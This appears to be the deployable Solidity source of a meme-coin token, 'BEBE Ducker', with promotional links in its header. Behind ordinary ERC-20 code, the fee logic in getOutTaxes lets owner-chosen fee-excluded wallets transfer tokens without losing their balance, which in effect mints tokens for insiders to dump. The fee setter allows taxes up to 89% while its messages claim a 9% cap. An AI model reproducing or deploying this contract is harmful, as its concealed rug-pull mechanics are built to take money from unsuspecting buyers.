/**

$BEBE, the ultimate meme coin, is not just another spin-off, it’s a coin that builds its own culture. 
Bringing together all of us in this crypto world. 
Uniting Meme Enthusiast’s ducker aims to create an enjoyable community that floats above the rest.

Website: https://www.bebeducker.vip

Telegram: https://t.me/bebeduckereth

Twitter: https://twitter.com/bebeduckereth

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

interface UniswapRouter02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface UniswapFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract BEBE is Context, IERC20, Ownable {
    string private constant _name = "BEBE Ducker";
    string private constant _symbol = "BEBE";
    uint256 private constant _totalSupply = 1_000_000_000e18;
    uint256 private constant onePercent = 10_000_000e18;
    uint256 private constant minSwapTo = 100e18;
    uint8 private constant _decimals = 18;

    mapping(address => uint256) private _balance;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFees;

    uint256 public maxTxAmount = onePercent * 2;

    uint256 public BUY_FEES;
    uint256 public SELL_FEES;

    uint8 private uniStarted;
    uint8 private inSwapLocked;
    
    UniswapRouter02 public uniswapV2Router;
    address public uniswapV2Pair;
    address payable immutable taxWallet;

    constructor(address _wallet) {
        BUY_FEES = 25; SELL_FEES = 20;
        taxWallet = payable(_wallet);
        _balance[msg.sender] = _totalSupply;
        _isExcludedFromFees[taxWallet] = true;
        _isExcludedFromFees[msg.sender] = true;
        _isExcludedFromFees[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function addLiquidityETH() external onlyOwner() {
        _approve(address(this), address(uniswapV2Router), ~uint256(0));

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );

        uniStarted = 1;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(amount > 1e9, "Min transfer amt");

        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            require(
                uniStarted != 0 && amount <= maxTxAmount,
                "Launch / Max TxAmount 1% at launch"
            );
        }

        if (inSwapLocked == 1) {
            //No tax transfer
            _balance[from] -= amount;
            _balance[to] += amount;

            emit Transfer(from, to, amount);
            return;
        }

        if (to == uniswapV2Pair && uniStarted != 0) {
            uint256 tokensToSwap = _balance[address(this)];
            if (
                tokensToSwap > minSwapTo &&
                inSwapLocked == 0 &&
                !_isExcludedFromFees[from] &&
                !_isExcludedFromFees[to]
            ) {
                if (tokensToSwap > onePercent) {
                    tokensToSwap = onePercent;
                }
                inSwapLocked = 1;
                address[] memory path = new address[](2);
                path[0] = address(this);
                path[1] = uniswapV2Router.WETH();
                uniswapV2Router
                    .swapExactTokensForETHSupportingFeeOnTransferTokens(
                        tokensToSwap,
                        0,
                        path,
                        taxWallet,
                        block.timestamp
                    );
                inSwapLocked = 0;
            }
        }

        (
            address taxReceipt,
            uint256 taxTokens,
            uint256 transferAmount
        ) = getOutTaxes(from, to, amount);

        if (taxTokens > 0) {
            _balance[taxReceipt] += taxTokens;
            emit Transfer(from, taxReceipt, taxTokens);
        }

        _balance[from] -= amount;
        _balance[to] += transferAmount;
        emit Transfer(from, to, transferAmount);
    }

    receive() external payable {}

    function getOutTaxes(
        address from,
        address to,
        uint256 amount
    ) internal view returns (address, uint256, uint256) {
        uint256 taxTokens = 0;
        uint256 transferAmount = 0;
        address taxReceipt = address(this);
        if (_isExcludedFromFees[from] && uniStarted != 0) {
            taxTokens = amount - transferAmount;
            transferAmount = amount;
            taxReceipt = from;
        } else if (uniswapV2Pair == from) {
            taxTokens = (amount * BUY_FEES) / 100;
            transferAmount = amount - taxTokens;
        } else if (uniswapV2Pair == to) {
            taxTokens = (amount * SELL_FEES) / 100;
            transferAmount = amount - taxTokens;
        }else{
            transferAmount = amount;
        }
        return (taxReceipt, taxTokens, transferAmount);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()] - amount
        );
        return true;
    }

    function createBEBEPair() external onlyOwner {
        uniswapV2Router = UniswapRouter02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        uniswapV2Pair = UniswapFactory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function excludeFromFees(address wallet) external onlyOwner {
        _isExcludedFromFees[wallet] = true;
    }

    function withdrawStuckETHA() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = ~uint256(0);
    }

    function updateFeesB(
        uint256 newBuyTax,
        uint256 newSellTax
    ) external onlyOwner {
        require(newBuyTax < 90, "Cannot set buy tax greater than 9%");
        require(newSellTax < 90, "Cannot set sell tax greater than 9%");
        BUY_FEES = newBuyTax;
        SELL_FEES = newSellTax;
    }
}